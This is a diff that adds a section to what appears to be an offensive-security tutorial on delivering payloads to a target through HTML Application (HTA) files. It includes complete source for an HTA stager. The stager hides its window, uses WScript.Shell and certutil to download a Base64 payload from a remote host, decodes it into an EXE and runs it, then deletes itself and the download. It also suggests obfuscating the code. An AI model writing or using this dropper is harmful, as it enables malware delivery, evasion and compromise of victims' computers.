@@ -140,6 +140,81 @@ Okay you have created the payload but now what?
 You can't just give an EXE to a target and hope for him/her to double-click on it right?
 Maybe that would have worked five-six decades ago but sure as hell no one's double-clicking on an unsigned, shady, standalone EXE payload without a compelling reason these days.
 
+Well what about an HTML Application or HTA? 
+
+Quoting _nccgroup_[link](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/),
+
+```
+A HTA file is usually made up of HTML and script such as JScript or VBScript, much like a normal web page.
+
+However, the difference with HTA files is that they run in full trust mode, with access to features that a normal web page wouldn’t have, such as ActiveX controls usually marked ‘unsafe for scripting’.
+
+This means that if an attacker was to serve a HTA file (for example, via a malicious webpage) and convince the user to click through two warnings, then the attacker could run malicious code on the victim's computer. All without needing an exploit or bypassing any of the latest and greatest mitigations.
+```
+
+So HTA files are not subject to the same stringent restrictions as HTML pages. What's more you can even use embedded JS or VBS code with ActiveX Objects such as `WScript.Shell`. This means you can potentially use an HTA to perform some malicious activity on the executing host machine. Sounds intriguing...
+
+So why don't we create an HTA that will download and execute our payload when it is run? In other words a stager which upon being run will download and execute the final stage payload. Let's do that!
+
+Here is the HTA source:
+
+```hta
+<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION ID="SI"
+APPLICATIONNAME="Downloader"
+WINDOWSTATE="minimize"
+MAXIMIZEBUTTON="no"
+MINIMIZEBUTTON="no"
+CAPTION="no"
+SHOWINTASKBAR="no">
+
+<script>
+// Obfuscate contents using: https://obfuscator.io/
+// Function to download the payload from the remote server as a Base64 encoded file
+function downloadpayload() {
+	a = new ActiveXObject('Wscript.Shell');
+	cmd = "certutil.exe -urlcache -split -f http://192.168.1.104:8000/payload.b64 payload.b64"
+	a.Run(cmd, 0);
+}
+// Function to convert the Base64 encoded file into an executable
+function decodepayload() {
+	e = new ActiveXObject('Wscript.Shell');
+	cmd = "certutil.exe -decode payload.b64 payload.exe"
+	e.Run(cmd, 0);
+}
+// Function to execute the payload
+function executepayload() {
+	b = new ActiveXObject('Wscript.Shell');
+	cmd = "payload.exe"
+	b.Run(cmd, 0);
+}
+// Function to delete the HTA stager, Base64 payload and close the mshta.exe process
+function cleanup() {
+	c = new ActiveXObject("Scripting.FileSystemObject");
+	filename = window.location.href;
+	filename = decodeURI(filename);
+	filename = filename.slice(8);
+	d = c.GetFile(filename);
+	d.Delete();
+	f = c.GetFile("payload.b64");
+	f.Delete();
+	window.close();
+}
+downloadpayload();
+setTimeout(decodepayload, 30000); // CHANGE THE SECONDS
+setTimeout(executepayload, 40000); // CHANGE THE SECONDS
+setTimeout(cleanup, 50000); // CHANGE THE SECONDS
+</script>
+
+</head>
+<body>
+</body>
+</html>
+```
+
+
 
 
 
